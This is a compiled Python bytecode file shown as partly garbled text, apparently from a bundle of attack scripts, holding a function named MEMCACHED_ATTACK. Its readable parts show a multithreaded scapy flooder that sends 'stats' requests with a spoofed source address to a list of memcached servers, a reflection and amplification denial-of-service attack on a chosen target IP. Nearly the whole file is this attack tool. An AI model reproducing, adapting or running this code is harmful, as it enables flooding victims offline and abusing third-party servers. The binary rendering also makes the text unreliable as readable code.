a
    ?w?a  ?                   @   s@   d dl Z d dlZd dlmZmZmZmZ d dlmZ dd? Z	dS )?    N)?IP?UDP?send?Raw)?Threadc                    s?   da |?d?d ?t|?d?d ??td? d?g }tdd??}|?? ? W d   ? n1 s\0    Y  ? ???fd	d
?}t| ?D ]4}tdt|? d ? t|d?}|?	?  |?
|? q?t?|? |D ]}da |??  q?td? d S )NF?:r   ?   z+[1;34m[*][0m Starting MEMCACHED attack...z       stats
z"toolso/other/memcached_servers.txt?rc                     s?   t s?? D ]?} t st?dd?}| ?dd?} z4t| ?d?t?dd? t?d? }t||d	d
? W n, ty? } zt	|? W Y d }~qd }~0 0 t	dt
|? d |  d ? qq d S )N?
   ??   ?
? )Zdst?srci?+  )ZsportZdport)?loadF)?count?verbosez[1;34m[*][0m Sending z forged UDP packets to ?...)?FINISH?random?randint?replacer   r   r   r   ?	Exception?print?str)ZserverZpacketsZpacket?e?Zmemcached_serversZpayloadZ	target_ipZtarget_port? ?8/storage/emulated/0/Script Vip/toolso/other/memcached.py?memcached_flood   s    "z)MEMCACHED_ATTACK.<locals>.memcached_floodz[1;34m[*][0m Staring thread r   )?targetTz [1;77m[i][0m Attack completed.)r   ?split?intr   ?open?	readlines?ranger   r   ?start?append?time?sleep?join)ZthreadsZattack_timer   Zthreads_list?fr   ?thread?tr   r   r   ?MEMCACHED_ATTACK   s&    &


r-   )
r   r'   Z	scapy.allr   r   r   r   Z	threadingr   r-   r   r   r   r   ?<module>   s   